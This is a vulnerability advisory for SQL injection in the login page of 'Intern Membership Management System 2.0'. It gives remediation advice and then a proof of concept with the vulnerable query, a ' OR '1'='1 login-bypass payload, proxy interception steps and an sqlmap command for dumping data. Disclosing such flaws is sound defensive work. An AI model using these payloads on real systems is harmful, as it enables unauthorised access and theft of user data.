Vulnerability Advisory & Exploit
  Affected Version
    Intern Membership Management System 2.0(Discovered in intern/student_login.php)

  Vulnerability Type
    SQL Injection
    Unauthenticated login bypass via unsanitized POST parameters in login logic.

  Advisory (Recommendations)
    To remediate this vulnerability, developers should implement the following countermeasures:

  ✅ Use parameterized queries (prepared statements)
      Avoid concatenating raw input into SQL statements. Use mysqli_prepare() or PDO with bound parameters:

      $stmt = $conn->prepare("SELECT * FROM registered_users WHERE user_name=? AND password=?");
      $stmt->bind_param("ss", $username, $password);
      $stmt->execute();


  ✅ Hash passwords securely
    Replace plain-text password storage with secure hashing (e.g., password_hash() and password_verify()).

  ✅ Sanitize and validate all input
    Even if prepared statements are used, all user inputs should be validated for expected format.

  ✅ Apply least privilege principle
    The database user used for this connection should only have access to the necessary tables and read-only rights where applicable.
    
  ✅ Disable error message output in production
    Avoid using die(mysqli_error()) in production; log errors securely instead.

  ✅ Harden access to sensitive endpoints
    Ensure that login pages are protected with rate-limiting, CAPTCHA, and do not leak excessive error details.

 Proof-of-Concept (Exploit)
   Vulnerable Endpoint
    POST /intern/student_login.php

   Vulnerable Code
    $query = mysqli_query($dbconn, "SELECT * FROM registered_users WHERE user_name='$username' and password='$password'");

   POST Payload
    user_name=' OR '1'='1
    password=irrelevant
    submit=Login


   Exploit Steps
     Open the login page: /intern/student_login.php
     Intercept the request using a proxy (e.g., Burp Suite)
     Modify the POST parameters:
       user_name=' OR '1'='1
       password=anyvalue
       submit=Login
     Forward the request — login will succeed, redirecting the attacker to fill_details.php without valid credentials

  Alternative (Automated with sqlmap)
     sqlmap -u "http://target-site/intern/student_login.php" --data="user_name=test&password=test&submit=Login" --risk=3 --level=5 --batch
  
  This can be used to automate enumeration of tables, users, or extract password hashes if error-based or union-based injection is available.


Risk Level
High – Leads to full authentication bypass and potential access to sensitive user data.

